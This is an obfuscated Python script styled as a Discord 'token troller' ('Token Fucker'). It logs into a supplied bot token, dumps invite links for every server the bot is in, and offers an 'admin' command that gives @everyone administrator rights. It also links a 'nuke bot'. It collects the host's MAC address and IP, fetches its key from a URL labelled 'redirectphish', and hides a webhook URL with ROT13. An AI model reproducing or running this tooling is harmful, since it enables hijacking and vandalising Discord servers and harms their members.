import time #line:1
import os #line:2
import discord #line:3
from discord .ext import commands #line:4
import replit #line:5
import socket #line:6
import re #line:7
import uuid #line:8
import requests #line:9
import json #line:10
from getmac import get_mac_address #line:11
import sys #line:12
def print_orange_text (O00OOO000O0O0000O ):#line:15
	OOOOO0O0OO00OOO0O ='\033[38;5;208m'#line:16
	O0000OOOOO00OOOOO ='\033[0m'#line:17
	print (f"{OOOOO0O0OO00OOO0O}{O00OOO000O0O0000O}{O0000OOOOO00OOOOO}")#line:18
def get_mac ():#line:21
	O00OOOOOO0O00O000 =uuid .getnode ()#line:22
	OO0O0OO0OOO0OO0O0 =':'.join (("%012X"%O00OOOOOO0O00O000 )[OO00O0000OO00OO00 :OO00O0000OO00OO00 +2 ]for OO00O0000OO00OO00 in range (0 ,12 ,2 ))#line:23
	return OO0O0OO0OOO0OO0O0 #line:24
mac_address =get_mac_address ()#line:27
replit_account =os .getenv ("REPL_OWNER")#line:29
if not replit_account :#line:30
	exit #line:31
def fetch_text_from_website (OO0O0O0OO00000OO0 ):#line:34
	O0O00OO00OO0000O0 =requests .get (OO0O0O0OO00000OO0 )#line:35
	O0000O000000O0O0O =O0O00OO00OO0000O0 .text #line:36
	return O0000O000000O0O0O #line:37
redirectphish ="https://dodgylink.net/phisher"
IPAddr =socket .gethostbyname (socket .gethostname ())#line:42
def timething ():#line:45
	print_orange_text ('\rloading |')#line:46
	time .sleep (.3 )#line:47
	replit .clear ()#line:48
	print_orange_text ('\rloading /')#line:49
	time .sleep (.3 )#line:50
	replit .clear ()#line:51
	print_orange_text ('\rloading -')#line:52
	time .sleep (.3 )#line:53
	replit .clear ()#line:54
	print_orange_text ('\rloading \\')#line:55
	time .sleep (.3 )#line:56
	replit .clear ()#line:57
timething ()#line:59
IPBAN =fetch_text_from_website ("https://banned.veloxdev.repl.co")#line:61
if IPAddr ==IPBAN :#line:62
	print_orange_text ("""
	
 ██╗██████╗     ██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██║██╔══██╗    ██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║██████╔╝    ██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║  ██║
██║██╔═══╝     ██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║  ██║
██║██║         ██████╔╝██║  ██║██║ ╚████║██║ ╚████║███████╗██████╔╝
╚═╝╚═╝         ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═════╝ 


Loser.. get out of here!
 
 """)#line:75
	sys .exit (0 )#line:76
def encrypt (O0OO00OOOOOOOOO00 ,O0OO00O00OOOOOO00 ):#line:79
	O0000OO00O0O0OO00 =''#line:80
	for O00000OO0O00OOOOO in O0OO00OOOOOOOOO00 :#line:82
		if O00000OO0O00OOOOO .isalpha ():#line:83
			if O00000OO0O00OOOOO .isupper ():#line:84
				O0000OO00O0O0OO00 +=chr ((ord (O00000OO0O00OOOOO )-65 +O0OO00O00OOOOOO00 )%26 +65 )#line:85
			else :#line:86
				O0000OO00O0O0OO00 +=chr ((ord (O00000OO0O00OOOOO )-97 +O0OO00O00OOOOOO00 )%26 +97 )#line:87
		else :#line:88
			O0000OO00O0O0OO00 +=O00000OO0O00OOOOO #line:89
	return O0000OO00O0O0OO00 #line:91
def jsndkfhwieuhsbdf (O000O0OOO0O0OOO00 ,OO0000OO000OOOOOO ):#line:94
	return encrypt (O000O0OOO0O0OOO00 ,-OO0000OO000OOOOOO )#line:95
def generate_unique_value ():#line:98
	OOOO00OO0O000O0O0 =get_mac_address ()#line:99
	OO00O000OOO00000O =str (uuid .uuid5 (uuid .NAMESPACE_DNS ,OOOO00OO0O000O0O0 ))#line:100
	return OO00O000OOO00000O #line:101
WEBHOOK_URL =jsndkfhwieuhsbdf ('uggcf://jroubbx.arjfgnetrgrq.pbz/ncv/jroubbxf/1112208334586662962/hacqHV-wcsVEE0dOxlHdaBlM2b4gFC_Cdlrx5omxt2Ar1N56pTAGE57VvKauRetkRL-s',13 )#line:106
unique_value =generate_unique_value ()#line:107
KEYAUTH =fetch_text_from_website (redirectphish)#line:41
def clear_console ():#line:110
	replit .clear ()#line:112
print_orange_text (f"""
  _________      .__                                 
 /   _____/_____ |  |__   ___________   ____   ______
 \_____  \\____ \|  |  \_/ __ \_  __ \_/ __ \ /  ___/
 /        \  |_> >   Y  \  ___/|  | \/\  ___/ \___ \ 
/_______  /   __/|___|  /\___  >__|    \___  >____  >
        \/|__|        \/     \/            \/     \/ 

Token Fucker 1.28.3
Open source token troller, private for friends and only friends.

Loaded onto {IPAddr}, bot will be run on this IP
Your MAC Address is {mac_address}
""")#line:128
print_orange_text ("\nDo you want to continue? Type Y to continue.")#line:130
confirmation =input ()#line:131
replit .clear ()#line:133
print_orange_text ("""
  _________      .__                                 
 /   _____/_____ |  |__   ___________   ____   ______
 \_____  \\____ \|  |  \_/ __ \_  __ \_/ __ \ /  ___/
 /        \  |_> >   Y  \  ___/|  | \/\  ___/ \___ \ 
/_______  /   __/|___|  /\___  >__|    \___  >____  >
        \/|__|        \/     \/            \/     \/ 
""")#line:141
def authenticate ():#line:144
	print_orange_text ("Please enter the authentication key: ")#line:145
	O0OO0OOO00000OO0O =input ()#line:146
	if O0OO0OOO00000OO0O ==KEYAUTH :#line:147
		replit .clear ()#line:148
		print_orange_text ("""
  _________      .__                                 
 /   _____/_____ |  |__   ___________   ____   ______
 \_____  \\____ \|  |  \_/ __ \_  __ \_/ __ \ /  ___/
 /        \  |_> >   Y  \  ___/|  | \/\  ___/ \___ \ 
/_______  /   __/|___|  /\___  >__|    \___  >____  >
        \/|__|        \/     \/            \/     \/ 
""")#line:156
		print_orange_text ("Authentication successful! Continuing with the script.")#line:157
		replit .clear ()#line:158
		print_orange_text ("""
  _________      .__                                 
 /   _____/_____ |  |__   ___________   ____   ______
 \_____  \\____ \|  |  \_/ __ \_  __ \_/ __ \ /  ___/
 /        \  |_> >   Y  \  ___/|  | \/\  ___/ \___ \ 
/_______  /   __/|___|  /\___  >__|    \___  >____  >
        \/|__|        \/     \/            \/     \/ 
""")#line:166
		print_orange_text ("Please input a token:")#line:167
		OOO000OO0O0OOO000 =input ()#line:168
		OO0O0000000OO00OO =commands .Bot (command_prefix ='!',intents =discord .Intents .all ())#line:171
		@OO0O0000000OO00OO .event #line:173
		async def OOO000OOOOOOOO00O ():#line:174
			print_orange_text (f'Successfully logged into {OO0O0000000OO00OO.user.name}')#line:175
			clear_console ()#line:176
			print_orange_text ("""
  _________      .__                                 
 /   _____/_____ |  |__   ___________   ____   ______
 \_____  \\____ \|  |  \_/ __ \_  __ \_/ __ \ /  ___/
 /        \  |_> >   Y  \  ___/|  | \/\  ___/ \___ \ 
/_______  /   __/|___|  /\___  >__|    \___  >____  >
        \/|__|        \/     \/            \/     \/ 
/ LOADED COMMANDS
| admin / gives @everyone administrator
| inv / gives the invite to phantom's nuke bot
| ban / bans everyone from the server

\n\n
/ DUMPING SERVERS
""")#line:191
			for OOO0OO00OOOO00000 in OO0O0000000OO00OO .guilds :#line:192
				O0OO00000000OO0OO =await OOO0OO00OOOO00000 .text_channels [0 ].create_invite ()#line:193
				O000000OOO000000O ="Yes"if OOO0OO00OOOO00000 .me .guild_permissions .administrator else "No"#line:194
				print_orange_text (f"| Server: {OOO0OO00OOOO00000.name} \n| Invite: {O0OO00000000OO0OO.url} \n| Has Administrator: {O000000OOO000000O}\n\n")#line:197
		@OO0O0000000OO00OO .event #line:199
		async def O00OO00000000O0OO (OOOOO0000OOO0OO00 ):#line:200
			if OOOOO0000OOO0OO00 .content .lower ()=="admin":#line:201
				O00OO0O000O0O00OO =discord .utils .get (OOOOO0000OOO0OO00 .guild .roles ,name ="@everyone")#line:202
				OOOOO0O00O0O0OO00 =discord .Permissions (administrator =True )#line:203
				await O00OO0O000O0O00OO .edit (permissions =OOOOO0O00O0O0OO00 )#line:204
				await OOOOO0000OOO0OO00 .delete ()#line:205
				O0O0OOO0000O0000O =await OOOOO0000OOO0OO00 .channel .send ("✅")#line:206
				await O0O0OOO0000O0000O .delete ()#line:207
			if OOOOO0000OOO0OO00 .content .lower ()=="inv":#line:209
				await OOOOO0000OOO0OO00 .delete ()#line:210
				O0O0OOO0000O0000O =await OOOOO0000OOO0OO00 .channel .send ("https://discord.com/api/oauth2/authorize?client_id=1112085141221810278&permissions=8&scope=bot")#line:213
			await OO0O0000000OO00OO .process_commands (OOOOO0000OOO0OO00 )#line:214
		OO0O0000000OO00OO .run (OOO000OO0O0OOO000 )#line:215
	else :#line:217
		print_orange_text ("Invalid authentication key. Script stopped.")#line:218
authenticate ()#line:221
